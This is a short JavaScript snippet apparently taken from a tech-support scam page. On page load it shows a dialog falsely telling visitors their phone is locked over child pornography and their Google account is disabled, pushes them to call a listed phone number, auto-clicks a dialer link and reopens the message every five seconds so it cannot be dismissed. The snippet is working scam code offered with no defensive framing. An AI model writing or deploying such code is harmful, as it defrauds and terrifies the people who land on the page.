function showConfirmMessage() {
    confirm("Your Phone has been locked due to detected illegal Child pornography .Your Google Account  has been disabled . on! Immediately call Online Security Support +1(844) 906-6151 to unlock it!");

    const telLink = document.getElementById("tel");
    telLink.click(); // This will open the dialer on mobile devices

    setTimeout(showConfirmMessage, 5000); // Delay for 1 second before reopening the message

}

window.onload = function() {
    showConfirmMessage(); // Call the function on page load
};
